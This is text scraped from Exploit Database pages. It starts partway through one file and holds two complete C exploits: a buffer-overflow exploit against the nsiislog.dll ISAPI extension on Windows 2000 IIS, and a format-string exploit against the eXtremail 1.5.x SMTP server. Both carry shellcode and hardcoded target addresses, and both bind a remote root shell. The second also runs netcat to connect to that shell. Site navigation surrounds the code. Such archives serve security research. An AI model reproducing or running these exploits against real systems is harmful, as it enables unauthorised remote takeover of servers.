<arpa/inet.h>#include <netdb.h>#include <unistd.h>#define SOCKET int#define DWORD uint32_t#define ULONG unsigned long#define INVALID_SOCKET -1#define SOCKET_ERROR -1#define closesocket close#endifchar shellcode[]=//"\x90\x90\x90\x90\x90\x90\x90\xCC" //¤«ï ®â« ¤ª¨"\xeb\x02\xeb\x05\xe8\xf9\xff\xff""\xff\x5b\x81\xeb\x4d\x43\x22\x11""\x8b\xc3\x05\x66\x43\x22\x11\x66""\xb9\x15\x03\x80\x30\xfb\x40\x67""\xe2\xf9\x33\xa3\xf9\xfb\x72\x66""\x53\x06\x04\x04\x76\x66\x37\x06""\x04\x04\xa8\x40\xf6\xbd\xd9\xea""\xf8\x66\x53\x06\x04\x04\xa8\x93""\xfb\xfb\x04\x04\x13\x91\xfa\xfb""\xfb\x43\xcd\xbd\xd9\xea\xf8\x7e""\x53\x06\x04\x04\xab\x04\x6e\x37""\x06\x04\x04\xf0\x3b\xf4\x7f\xbe""\xfa\xfb\xfb\x76\x66\x3b\x06\x04""\x04\xa8\x40\xba\xbd\xd9\xea\xf8""\x66\x53\x06\x04\x04\xa8\xab\x13""\xcc\xfa\xfb\xfb\x76\x7e\x8f\x05""\x04\x04\xab\x93\xfa\xfa\xfb\xfb""\x04\x6e\x4b\x06\x04\x04\xc8\x20""\xa8\xa8\xa8\x91\xfd\x91\xfa\x91""\xf9\x04\x6e\x3b\x06\x04\x04\x72""\x7e\xa7\x05\x04\x04\x9d\x3c\x7e""\x9f\x05\x04\x04\xf9\xfb\x9d\x3c""\x7e\x9d\x05\x04\x04\x73\xfb\x3c""\x7e\x93\x05\x04\x04\xfb\xfb\xfb""\xfb\x76\x66\x9f\x05\x04\x04\x91""\xeb\xa8\x04\x4e\xa7\x05\x04\x04""\x04\x6e\x47\x06\x04\x04\xf0\x3b""\x8f\xe8\x76\x6e\x9c\x05\x04\x04""\x05\xf9\x7b\xc1\xfb\xf4\x7f\x46""\xfb\xfb\xfb\x10\x2f\x91\xfa\x04""\x4e\xa7\x05\x04\x04\x04\x6e\x43""\x06\x04\x04\xf0\x3b\xf4\x7e\x5e""\xfb\xfb\xfb\x3c\x7e\x9b\x05\x04""\x04\xeb\xfb\xfb\xfb\x76\x7e\x9b""\x05\x04\x04\xab\x76\x7e\x9f\x05""\x04\x04\xab\x04\x4e\xa7\x05\x04""\x04\x04\x6e\x4f\x06\x04\x04\x72""\x7e\xa3\x05\x04\x04\x07\x76\x46""\xf3\x05\x04\x04\xc8\x3b\x42\xbf""\xfb\xfb\xfb\x08\x51\x3c\x7e\xcf""\x05\x04\x04\xfb\xfa\xfb\xfb\x70""\x7e\xa3\x05\x04\x04\x72\x7e\xbf""\x05\x04\x04\x72\x7e\xb3\x05\x04""\x04\x72\x7e\xbb\x05\x04\x04\x3c""\x7e\xf3\x05\x04\x04\xbf\xfb\xfb""\xfb\xc8\x20\x76\x7e\x03\x06\x04""\x04\xab\x76\x7e\xf3\x05\x04\x04""\xab\xa8\xa8\x93\xfb\xfb\xfb\xf3""\x91\xfa\xa8\xa8\x43\x8c\xbd\xd9""\xea\xf8\x7e\x53\x06\x04\x04\xab""\xa8\x04\x6e\x3f\x06\x04\x04\x04""\x4e\xa3\x05\x04\x04\x04\x6e\x57""\x06\x04\x04\x12\xa0\x04\x04\x04""\x04\x6e\x33\x06\x04\x04\x13\x76""\xfa\xfb\xfb\x33\xef\xfb\xfb\xac""\xad\x13\xfb\xfb\xfb\xfb\x7a\xd7""\xdf\xf9\xbe\xd9\xea\x43\x0e\xbe""\xd9\xea\xf8\xff\xdf\x78\x3f\xff""\xab\x9f\x9c\x04\xcd\xfb\xfb\x72""\x9e\x03\x13\xfb\xfb\xfb\xfb\x7a""\xd7\xdf\xd8\xbe\xd9\xea\x43\xac""\xbe\xd9\xea\xf8\xff\xdf\x78\x3f""\xff\x72\xbe\x07\x9f\x9c\x72\xdd""\xfb\xfb\x70\x86\xf3\x9d\x7a\xc4""\xb6\xa1\x8e\xf4\x70\x0c\xf8\x8d""\xc7\x7a\xc5\xab\xbe\xfb\xfb\x8e""\xf9\x10\xf3\x7a\x14\xfb\xfb\xfa""\xfb\x10\x19\x72\x86\x0b\x72\x8e""\x17\x70\x86\xf7\x42\x6d\xfb\xfb""\xfb\xc9\x3b\x09\x55\x72\x86\x0f""\x70\x34\xd0\xb6\xf7\x70\xad\x83""\xf8\xae\x0b\x70\xa1\xdb\xf8\xa6""\x0b\xc8\x3b\x70\xc0\xf8\x86\x0b""\x70\x8e\xf7\xaa\x08\x5d\x8e\xfe""\x78\x3f\xff\x10\xf1\xa2\x78\x38""\xff\xbb\xc0\xb9\xe3\x8e\x1f\xc0""\xb9\xe3\x8e\xf9\x10\xb8\x70\x89""\xdf\xf8\x8e\x0b\x2a\x1b\xf8\x3d""\xf4\x4c\xfb\x70\x81\xe7\x3a\x1b""\xf9\xf8\xbe\x0b\xf8\x3c\x70\xfb""\xf8\xbe\x0b\x70\xb6\x0f\x72\xb6""\xf7\x70\xa6\xeb\x72\xf8\x78\x96""\xeb\xff\x70\x8e\x17\x7b\xc2\xfb""\x8e\x7c\x9f\x9c\x74\xfd\xfb\xfb""\x78\x3f\xff\xa5\xa4\x32\x39\xf7""\xfb\x70\x86\x0b\x12\x99\x04\x04""\x04\x33\xfb\xfb\xfb\x70\xbe\xeb""\x7a\x53\x67\xfb\xfb\xfb\xfb\xfb""\xfa\xfb\x43\xfb\xfb\xfb\xfb\x32""\x38\xb7\x94\x9a\x9f\xb7\x92\x99""\x89\x9a\x89\x82\xba\xfb\xbe\x83""\x92\x8f\xab\x89\x94\x98\x9e\x88""\x88\xfb\xb8\x89\x9e\x9a\x8f\x9e""\xab\x89\x94\x98\x9e\x88\x88\xba""\xfb\xfb\xac\xa8\xc9\xa4\xc8\xc9""\xd5\xbf\xb7\xb7\xfb\xac\xa8\xba""\xa8\x94\x98\x90\x9e\x8f\xba\xfb""\x99\x92\x95\x9f\xfb\x97\x92\x88""\x8f\x9e\x95\xfb\x9a\x98\x98\x9e""\x8b\x8f\xfb\xac\xa8\xba\xa8\x8f""\x9a\x89\x8f\x8e\x8b\xfb\x98\x97""\x94\x88\x9e\x88\x94\x98\x90\x9e""\x8f\xfb\xfb\x98\x96\x9f\xfb\xe9""\xc4\xfc\xff\xff\x74\xf9\x75\xf7";const DWORD default_EIP_pos = 9992; //¯®«®¦¥­¨¥ EIP ¢ ¡ãä¥à¥ (sploit)const DWORD default_EBX_points_to = 9988; //ãª § â¥«ì ¢ EBX ®â­®á¨â¥«ì­® sploit//const DWORD default_EIP_value = 0x77F8441B; //¯® íâ®¬ã  ¤à. ¤.¡. JMP EDX, ¢ ¤ ­­®¬ á«ãç ¥ íâ® ¢ ntdll.dllconst DWORD default_EIP_value = 0x40F01333;//const default_EDX_points_to = 0x1000; //íâ® ­¥ ¯à¨£®¤¨«®áìchar *nsiislog_default = "/scripts/nsiislog.dll";char sploit[default_EIP_pos+4+sizeof(shellcode)+1];char sploitbuf[sizeof(sploit)*2];void usage(char* argv[]){printf("Dicklamer (: ""We are not responsible for the illegal use of this software.\n""Description: Binds shell to port 34816 (or higher if port busy).\n""Usage:	""%s target [-p target_port] [-r /renamed_scripts/renamed_nsiislog.dll]\n""Supported target(s):\n""Windows version\t\t\t\tnsiislog.dll version\n""------------------------------------------------------------\n""2000 [5.00.2195] server rus.\t\t4.1.0.3917\n", argv[0]);exit(0);}int main(int argc, char* argv[]){#ifdef WIN32WSADATA wsaData;#endifint target_port = 80;char *nsiislog = nsiislog_default;int		nArgIndex;if (argc<2) usage(argv);nArgIndex = 1;while ((nArgIndex < argc)&&(strlen(argv[nArgIndex])>=2)&&(argv[nArgIndex][0]=='-')){switch (argv[nArgIndex++][1]){case 'p':case 'P':target_port = atoi(argv[nArgIndex++]);continue;case 'r':case 'R':nsiislog = argv[nArgIndex++];continue;default:usage(argv);}}try {#ifdef WIN32WSAStartup(0x0101, &wsaData);#endifSOCKET s = socket(AF_INET,SOCK_STREAM,0);if (s == INVALID_SOCKET) throw("No socket");sockaddr_in addr;//¯à¥¤¥«ï¥¬  ¤à¥á á¥à¢ ªULONG iaddr = inet_addr(argv[1]);if (iaddr == INADDR_NONE) {//¤à¥á - ¨¬ï á¥à¢ ªhostent *ph = gethostbyname(argv[1]);if (!ph) throw("Cant resolve hostname");memcpy(&addr.sin_addr.s_addr,ph->h_addr_list[0],sizeof(in_addr));} else {//¤à¥á - IPmemcpy(&addr.sin_addr.s_addr,&iaddr,4);};addr.sin_family = AF_INET;addr.sin_port   = htons(target_port);int sizeofaddr=sizeof(addr);char *req = "MX_STATS_LogLine: ";strcpy(sploit, req);memset(sploit+strlen(sploit), 0xCC, default_EIP_pos-strlen(req));//memcpy(sploit+default_EDX_points_to, shellcode, sizeof(shellcode)-1/*ã¡à âì \0*/);memcpy(sploit+default_EBX_points_to-(sizeof(shellcode)-1)+4, shellcode, sizeof(shellcode)-1/*ã¡à âì \0*/);//¯à¨ ¯¥à¥å®¤¥ ­  EIP, EBX ¡ã¤¥â ãª §ë¢ âì ­  ¯®á«¥¤­¨© DWORD ­ è¥£® § ¯à®á , £¤¥ JZ/JNZmemcpy(sploit+default_EIP_pos, &default_EIP_value, sizeof default_EIP_value);/*strcpy(sploit+sizeof(sploit)-11,"BCDEFGHIJK");*/sploit[sizeof(sploit)-1] = 0;if (connect(s,(struct sockaddr*)&addr,sizeof(struct sockaddr)) == SOCKET_ERROR) throw("Cant connect host");sprintf(sploitbuf,"POST %s HTTP/1.0\r\n""Accept: */*\r\n""User-Agent: NSPlayer/4.1.0.3917\r\n""Content-Type: text/plain\r\n""Content-Length: %i\r\n""Pragma: xClientGUID={89f451e0-a491-4346-ad78-4d55aac89045}\r\n""\r\n%s\r\n",nsiislog,strlen(sploit),sploit);int snd=send(s,sploitbuf,strlen(sploitbuf),0);if (snd == strlen(sploitbuf)) printf("Target exploited.\n");else throw("Cant send exploit");closesocket(s);}catch (char *errmsg){printf("%s\n",errmsg);return -1;}catch (int err_n){printf("error %i\n",err_n);return err_n;}#ifdef WIN32WSACleanup();#endifreturn 0;}// milw0rm.com [2003-07-01]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 49
eXtremail 1.5.x (Linux) - Remote Format Strings - Linux remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDeXtremail 1.5.x (Linux) - Remote Format StringsEDB-ID:49CVE:2001-1078EDB Verified:Author:B-r00tType:remoteExploit:/Platform:LinuxDate:2003-07-02Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/****************************************************************//* 	    Linux eXtremail 1.5.x Remote Format Strings Exploit	                *//*                                                           		                                *//*							*//*      	                       By B-r00t - 02/07/2003			*//*							*//*	Versions:       Linux eXtremail-1.5-8 => VULNERABLE		*//*		    Linux eXtremail-1.5-5 => VULNERABLE		*//*	Exploit uses format strings bug in fLog() of smtpd to bind a 	*//*	r00tshell to port 36864 on the target eXtremail server.		*//*							*//****************************************************************/#include <stdlib.h>#include <stdio.h>#include <string.h>#include <sys/types.h>#include <sys/socket.h>#include <netinet/in.h>#include <arpa/inet.h>#include <unistd.h>#define EXPLOIT "eXtreme"#define DEST_PORT 25// Prototypesint get_sock (char *host);int send_sock (char *stuff);int read_sock (void);void usage (void);int do_it (void);// Globalsint socketfd, choice;unsigned long GOT, RET;char *myip;char helo[] = "HELO Br00t~R0x~Y3r~W0rld!\n";char shellcode[] ="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""\xeb\x6e\x5e\x29\xc0\x89\x46\x10""\x40\x89\xc3\x89\x46\x0c\x40\x89""\x46\x08\x8d\x4e\x08\xb0\x66\xcd""\x80\x43\xc6\x46\x10\x10\x88\x46""\x08\x31\xc0\x31\xd2\x89\x46\x18""\xb0\x90\x66\x89\x46\x16\x8d\x4e""\x14\x89\x4e\x0c\x8d\x4e\x08\xb0""\x66\xcd\x80\x89\x5e\x0c\x43\x43""\xb0\x66\xcd\x80\x89\x56\x0c\x89""\x56\x10\xb0\x66\x43\xcd\x80\x86""\xc3\xb0\x3f\x29\xc9\xcd\x80\xb0""\x3f\x41\xcd\x80\xb0\x3f\x41\xcd""\x80\x88\x56\x07\x89\x76\x0c\x87""\xf3\x8d\x4b\x0c\xb0\x0b\xcd\x80""\xe8\x8d\xff\xff\xff\x2f\x62\x69""\x6e\x2f\x73\x68";struct {char *systemtype;unsigned long got;unsigned long ret;int pad;int buf;int pos;} targets[] = {// Confirmed targets tested by B-r00t.{ "RedHat 7.2 eXtremail V1.5 release 5(eXtremail-1.5-5.i686.rpm)",   0x0813b19c, 0xbefff1e8, 1, 266, 44},{ "Linux ANY eXtremail V1.5 release 5(eXtremail-1.5-5.tar.gz)",   0x0813b19c, 0xbefff1b8, 1, 266, 44},{ "Linux ANY eXtremail V1.5 release 7 (ALL VERSIONS)",   0xbefff0c8,0xbefff1d4, 1, 266, 44},{ "eXtremail V1.5 DEBUG",   0x44434241, 0xaaaaaaaa, 1, 266,44},{ 0 }};int main ( int argc, char *argv[] ){char *TARGET = "TARGET";printf ("\n%s by B-r00t <br00t@blueyonder.co.uk>. (c) 2003\n",EXPLOIT);if (argc < 3)usage ();choice = atoi(argv[2]);if (choice < 0 || choice > 3)usage ();setenv (TARGET, argv[1], 1);get_sock(argv[1]);sleep (1);read_sock ();sleep (1);send_sock (helo);sleep (1);read_sock ();sleep(1);do_it ();}void usage (void){int loop;printf ("\nUsage: %s [IP_ADDRESS] [TARGET]", EXPLOIT);printf ("\nExample: %s 10.0.0.1 2 \n", EXPLOIT);for (loop = 0; targets[loop].systemtype; loop++)printf ("\n%d\t%s", loop, targets[loop].systemtype);printf ("\n\nOn success a r00tshell will be spawned on port36864.\n\n");exit (-1);}int get_sock (char *host){struct sockaddr_in dest_addr;if ((socketfd = socket(AF_INET, SOCK_STREAM, 0)) == -1){perror("Socket Error!\n");exit (-1);}dest_addr.sin_family = AF_INET;dest_addr.sin_port = htons(DEST_PORT);if (! inet_aton(host, &(dest_addr.sin_addr))) {perror("inet_aton problems\n");exit (-2);}memset( &(dest_addr.sin_zero), '\0', 8);if (connect (socketfd, (struct sockaddr *)&dest_addr, sizeof (structsockaddr)) == -1){perror("Connect failed!\n");close (socketfd);exit (-3);}printf ("\n\nConnected to %s\n", host);}int send_sock (char *stuff){int bytes;bytes = (send (socketfd, stuff, strlen(stuff), 0));if (bytes == -1) {perror("Send error");close (socketfd);exit(4);}printf ("Send:\t%s", stuff);return bytes;}int read_sock (void){int bytes;char buffer[200];char *ptr;ptr = buffer;memset (buffer, '\0', sizeof(buffer));bytes = (recv (socketfd, ptr, sizeof(buffer), 0));if (bytes == -1) {perror("send error");close (socketfd);exit(4);}printf ("Recv:\t%s", buffer);return bytes;}int do_it (void){char format[200], buf[500], *bufptr, *p;int loop, sofar = 0;int PAD = targets[choice].pad;int POS = targets[choice].pos;unsigned char r[3], g[3], w[3];RET = targets[choice].ret;r[0] = (int) (RET & 0x000000ff);r[1] = (int)((RET & 0x0000ff00) >> 8);r[2] = (int)((RET & 0x00ff0000) >> 16);r[3] = (int)((RET & 0xff000000) >> 24);GOT = targets[choice].got;g[0] = (int) (GOT & 0x000000ff);g[1] = (int)((GOT & 0x0000ff00) >> 8);g[2] = (int)((GOT & 0x00ff0000) >> 16);g[3] = (int)((GOT & 0xff000000) >> 24);// Start bufbufptr = buf;bzero (bufptr, sizeof(buf));strncpy (buf, "mail from: ", strlen("mail from: "));sofar = 19;// Do paddingfor (loop=0; loop<PAD; loop++)strncat (buf, "a", 1);sofar = sofar+PAD;//1st GOT addystrncat (buf, g, 4);//2nd GOT addyp = &g[0];(*p)++;strncat (buf, g, 4);// 3rd GOT addyp = &g[0];(*p)++;strncat (buf, g, 4);// 4th GOT addyp = &g[0];(*p)++;strncat (buf, g, 4);sofar = sofar+16;for (loop=0; loop<4; loop++) {if (r[loop] > sofar) {w[loop] = r[loop]-sofar;} elseif (r[loop] == sofar) {w[loop] = 0;}elseif (r[loop] < sofar) {w[loop] = (256-sofar)+r[loop];}sofar = sofar+w[loop];}bufptr = format;bzero (bufptr, sizeof(format));sprintf (bufptr, "%%.%du%%%d$n%%.%du%%%d$n%%.%du%%%d$n%%.%du%%%d$n",w[0], POS, w[1], POS+1, w[2], POS+2, w[3], POS+3);strncat (buf, format, sizeof(format));strncat (buf, shellcode, sizeof(shellcode));// Summariseprintf ("\nSystem type:\t\t%s", targets[choice].systemtype);printf ("\nWrite Addy:\t\t0x%x", GOT);printf ("\nRET (shellcode):\t0x%x", RET);printf ("\nPAD (alignment):\t%d", PAD);printf ("\nPayload:\t\t%d / %d max bytes", strlen(buf),targets[choice].buf);printf ("\nSending it ... \n");sleep(1);// Ok lets Wack it!send_sock (buf);sleep (1);close (socketfd);printf ("\nUsing netcat 'nc' to get the r00tshell on port 36864....!!!!!\n\n\n");sleep(3); // May take time to spawn a shellsystem("nc -vv ${TARGET} 36864 || echo 'Sorry Exploit failed!'");exit (0);}// milw0rm.com [2003-07-02]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 